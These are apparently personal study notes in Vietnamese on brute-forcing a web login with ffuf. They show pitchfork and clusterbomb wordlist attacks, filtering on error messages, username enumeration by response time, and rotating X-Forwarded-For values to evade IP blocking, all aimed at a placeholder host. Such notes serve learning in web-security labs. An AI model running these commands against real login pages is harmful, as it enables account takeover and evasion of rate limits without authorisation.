> [!NOTE]
> ### **1-dùng fuf với file request có sẵn trên burp để có thể brute force**
> ```bash
> ffuf -request login.txt -request-proto http \
>      -w wordlist_username.txt:USER \
>      -w wordlist_password.txt:PASS \
>      -mode pitchfork \
>      -fr "Invalid username or password."
> 
> Trong file `login.txt`, bạn đặt keyword vào đúng vị trí:
> ```
> 
> 
> ### -chọn mode
> ```bash 
> ffuf -request login.txt -request-proto http \
>      -w wordlist_username.txt:USER \
>      -w wordlist_password.txt:PASS \
>      -mode clusterbomb \
>      -fr "Invalid username or password."
> ```
> 
> ```text
> 
> POST /login HTTP/1.1
> Host: target.com
> Content-Type: application/x-www-form-urlencoded
> username=USER&password=PASS
> 
> ```
> 
> ### -các cờ để lọc
> - -ft '<200'  --> lấy các request <200ms
> 

-bypass chặn ip
dùng header forwarding : IP
![[Pasted image 20261007151141.png]]

> [!NOTE]
>  - sau đó chạy fuff thay cho tham số ip bên dưới
> - Tạo file số cho `X-Forwarded-For`
> ```
> seq 1 100 > numbers.txt
> ```
> ## Chạy ffuf enumerate username
> 
> ```bash
> 
> ffuf -request login.txt -request-proto https \
>      -w wordlist_username.txt:USER \
>      -w numbers.txt:IP \
>      -mode pitchfork \
>      -ft '<200' \
>      -o result.json
>```
>   

